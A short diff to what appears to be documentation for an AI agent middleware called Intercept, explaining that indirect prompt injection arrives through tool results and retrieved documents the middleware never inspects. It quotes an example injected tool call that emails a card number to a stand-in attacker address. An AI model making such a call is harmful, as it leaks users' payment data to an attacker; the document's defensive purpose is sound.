@@ -14,7 +14,7 @@ Every other Intercept middleware inspects what goes _out_: the prompt, and the t
 
 None of them see what comes _back in_. Tool results, retrieved documents, and conversation history never pass through the middleware pipeline, which is exactly where indirect prompt injection lives.
 
-When an agent is manipulated by content Intercept never saw, the damage almost always surfaces as a tool call:
+When content that Intercept never saw manipulates an agent, the damage almost always surfaces as a tool call:
 
 ```text
 send_email(to: "attacker@example.com", body: "card 4111111111111111")
